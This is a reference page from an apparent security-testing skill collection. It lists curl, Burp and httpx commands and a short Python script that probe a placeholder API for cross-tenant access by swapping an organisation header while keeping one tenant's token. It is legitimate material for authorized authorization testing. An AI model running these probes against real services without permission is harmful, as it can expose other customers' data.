# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authorization-and-idor-tenant-isolation`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -si https://target.example/api/reports/42 -H 'Authorization: Bearer A' -H 'X-Org-Id: tenant-b'` | Test whether the org selector overrides the principal's tenant binding | Cross-platform |
| `Burp Suite Repeater` | `Swap the org or tenant identifier while keeping the tenant-A credential` | Confirm whether tenant scope is request-derived rather than bound to the session | Cross-platform |
| `httpx` | `httpx -u https://target.example/api/reports/42 -H 'X-Org-Id: tenant-b' -sc -cl` | Batch-compare status and length across org ids for cross-tenant reach | Cross-platform |

## Minimal Script Shape

A tenant-switch differential: it requests a report with the caller's org and with a foreign org header under one token, then reports a cross-tenant leak when the foreign org returns data.

```python
import urllib.error
import urllib.request

BASE = "https://target.example/api/reports/42"

def get(org, token):
    req = urllib.request.Request(BASE, headers={"Authorization": "Bearer " + token,
                                                "X-Org-Id": org})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

token = "<tenant-a-token>"
own_org = get("tenant-a", token)
other_org = get("tenant-b", token)
print({"own_org": own_org, "other_org": other_org,
       "cross_tenant": other_org[0] == 200 and other_org[1] > 0})
```
